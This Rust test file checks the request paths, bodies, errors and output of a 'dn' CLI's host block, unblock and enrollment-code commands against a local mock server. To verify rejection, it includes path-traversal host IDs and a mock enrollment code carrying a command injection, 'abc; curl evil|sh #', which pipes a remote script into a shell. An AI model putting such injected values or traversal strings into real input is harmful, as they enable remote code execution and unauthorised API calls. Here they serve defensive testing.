//! What `host block` / `host unblock` / `host enroll-code` put on the wire,
//! against a mock that answers every request with one canned body.

mod common;

use std::io::{BufRead, BufReader, Read, Write};
use std::net::TcpListener;
use std::process::{Command, Output};
use std::sync::{Arc, Mutex};
use std::thread;

use common::mock_id;
use serde_json::{Value, json};

/// One recorded request: method, target, and the parsed JSON body (`Null`
/// when there was none).
type Request = (String, String, Value);

fn serve(body: String) -> (String, Arc<Mutex<Vec<Request>>>) {
    serve_status("200 OK", body)
}

/// Like [`serve`], answering every request with `status` (e.g. `"404 Not Found"`).
fn serve_status(status: &'static str, body: String) -> (String, Arc<Mutex<Vec<Request>>>) {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!("http://{}", listener.local_addr().unwrap());
    let seen = Arc::new(Mutex::new(Vec::new()));
    let log = Arc::clone(&seen);
    thread::spawn(move || {
        for stream in listener.incoming() {
            let mut stream = stream.unwrap();
            let mut reader = BufReader::new(stream.try_clone().unwrap());
            let mut request_line = String::new();
            reader.read_line(&mut request_line).unwrap();
            let mut content_length = 0;
            let mut line = String::new();
            while reader.read_line(&mut line).unwrap() > 2 {
                if let Some((name, value)) = line.split_once(':')
                    && name.eq_ignore_ascii_case("content-length")
                {
                    content_length = value.trim().parse().unwrap();
                }
                line.clear();
            }
            let mut raw = vec![0; content_length];
            reader.read_exact(&mut raw).unwrap();
            let sent = if raw.is_empty() {
                Value::Null
            } else {
                serde_json::from_slice(&raw).unwrap()
            };
            let mut parts = request_line.split(' ');
            let method = parts.next().unwrap_or_default().to_string();
            let target = parts.next().unwrap_or_default().to_string();
            log.lock().unwrap().push((method, target, sent));
            write!(
                stream,
                "HTTP/1.1 {status}\r\nContent-Type: application/json\r\n\
                 Content-Length: {}\r\nConnection: close\r\n\r\n{body}",
                body.len()
            )
            .unwrap();
        }
    });
    (url, seen)
}

fn dn(url: &str, args: &[&str]) -> Output {
    let dir = tempfile::tempdir().unwrap();
    Command::new(env!("CARGO_BIN_EXE_dn"))
        .args(args)
        .env("DN_CONFIG_DIR", dir.path())
        .env("DEFINED_API_URL", url)
        .env("DEFINED_API_KEY", "fake-test-key")
        .output()
        .unwrap()
}

fn requests(seen: &Arc<Mutex<Vec<Request>>>) -> Vec<Request> {
    seen.lock().unwrap().clone()
}

fn host_body(id: &str, blocked: bool) -> String {
    json!({"data": {"id": id, "name": "Build Server", "isBlocked": blocked}, "metadata": {}})
        .to_string()
}

#[test]
fn block_posts_to_v2_and_prints_the_host() {
    let host = mock_id("host", "build server");
    let (url, seen) = serve(host_body(&host, true));
    let out = dn(&url, &["--json", "host", "block", &host]);
    assert!(out.status.success(), "{out:?}");
    let printed: Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(printed["data"]["isBlocked"], true);
    assert_eq!(
        requests(&seen),
        [(
            "POST".to_string(),
            format!("/v2/hosts/{host}/block"),
            json!({})
        )]
    );
}

#[test]
fn unblock_posts_to_v2_and_says_so() {
    let host = mock_id("host", "build server");
    let (url, seen) = serve(host_body(&host, false));
    let out = dn(&url, &["host", "unblock", &host]);
    assert!(out.status.success(), "{out:?}");
    assert_eq!(
        String::from_utf8(out.stdout).unwrap(),
        format!("Unblocked host \"Build Server\" ({host})\n")
    );
    assert_eq!(
        requests(&seen),
        [(
            "POST".to_string(),
            format!("/v2/hosts/{host}/unblock"),
            json!({})
        )]
    );
}

#[test]
fn enroll_code_sends_the_lifetime_only_when_given() {
    let host = mock_id("host", "build server");
    let body = json!({"data": {"code": "abc123", "lifetimeSeconds": 3600}}).to_string();
    let (url, seen) = serve(body);
    let path = format!("/v1/hosts/{host}/enrollment-code");

    let out = dn(&url, &["host", "enroll-code", &host]);
    assert!(out.status.success(), "{out:?}");
    let stdout = String::from_utf8(out.stdout).unwrap();
    assert!(stdout.contains("dnclient enroll abc123"), "{stdout}");
    assert!(stdout.contains("expires in 1h"), "{stdout}");

    let out = dn(
        &url,
        &["host", "enroll-code", &host, "--code-lifetime", "3600"],
    );
    assert!(out.status.success(), "{out:?}");

    assert_eq!(
        requests(&seen),
        [
            ("POST".to_string(), path.clone(), json!({})),
            ("POST".to_string(), path, json!({"lifetimeSeconds": 3600})),
        ]
    );
}

#[test]
fn bad_input_fails_before_any_request() {
    let host = mock_id("host", "build server");
    let (url, seen) = serve(host_body(&host, true));
    for args in [
        vec!["host", "block", "host-A/../unblock"],
        vec!["host", "unblock", ""],
        vec!["host", "enroll-code", "host-A?x=1"],
        vec!["host", "enroll-code", &host, "--code-lifetime", "59"],
        vec!["host", "enroll-code", &host, "--code-lifetime", "604801"],
    ] {
        let out = dn(&url, &args);
        assert!(!out.status.success(), "{args:?} should fail");
    }
    assert!(requests(&seen).is_empty());
}

#[test]
fn api_errors_surface_with_exit_1_and_send_one_request() {
    let host = mock_id("host", "build server");
    let blocked = r#"{"errors":[{"code":"ERR_HOST_BLOCKED","message":"cannot create enrollment code for blocked host - unblock the host to continue"}]}"#;
    let missing = r#"{"errors":[{"code":"ERR_NOT_FOUND","message":"resource not found"}]}"#;
    for (status, body, cmd, path, code) in [
        (
            "400 Bad Request",
            blocked,
            "enroll-code",
            format!("/v1/hosts/{host}/enrollment-code"),
            "ERR_HOST_BLOCKED",
        ),
        (
            "404 Not Found",
            missing,
            "block",
            format!("/v2/hosts/{host}/block"),
            "ERR_NOT_FOUND",
        ),
        (
            "404 Not Found",
            missing,
            "unblock",
            format!("/v2/hosts/{host}/unblock"),
            "ERR_NOT_FOUND",
        ),
    ] {
        let (url, seen) = serve_status(status, body.to_string());
        let out = dn(&url, &["--json", "host", cmd, &host]);
        assert_eq!(out.status.code(), Some(1), "{cmd}: {out:?}");
        let printed: Value = serde_json::from_slice(&out.stdout).unwrap();
        assert_eq!(printed["errors"][0]["code"], code, "{cmd}");
        let sent: Vec<_> = requests(&seen)
            .into_iter()
            .map(|(m, p, _)| (m, p))
            .collect();
        assert_eq!(sent, [("POST".to_string(), path)], "{cmd}");
    }
}

#[test]
fn enroll_code_json_passes_the_code_through() {
    let host = mock_id("host", "build server");
    let body = json!({"data": {"code": "H8NEbm99QvupjqW1PsdVR9DNSiFmoQtJXyGTQxerlSU", "lifetimeSeconds": 86400}});
    let (url, _) = serve(body.to_string());
    let out = dn(&url, &["--json", "host", "enroll-code", &host]);
    assert!(out.status.success(), "{out:?}");
    let printed: Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(printed, body);
}

/// A 200 that doesn't say what the command needs is a failure in the human
/// view, never a success with a blank or unconfirmed line.
#[test]
fn malformed_success_responses_fail_in_the_human_view() {
    let host = mock_id("host", "build server");
    let other = mock_id("host", "someone else");
    for (cmd, body) in [
        ("block", json!({"data": {}})),
        ("block", json!({"data": {"id": host, "isBlocked": false}})),
        ("block", json!({"data": {"id": other, "isBlocked": true}})),
        ("unblock", json!({"data": {"id": host, "isBlocked": true}})),
        ("unblock", json!({})),
        ("enroll-code", json!({"data": {}})),
        (
            "enroll-code",
            json!({"data": {"code": "abc; curl evil|sh #", "lifetimeSeconds": 60}}),
        ),
        (
            "enroll-code",
            json!({"data": {"code": "abc", "lifetimeSeconds": 0}}),
        ),
    ] {
        let (url, _) = serve(body.to_string());
        let out = dn(&url, &["host", cmd, &host]);
        let stdout = String::from_utf8_lossy(&out.stdout);
        assert_eq!(out.status.code(), Some(1), "{cmd} {body}: {stdout}");
        assert!(stdout.is_empty(), "{cmd} {body}: {stdout}");
    }
}
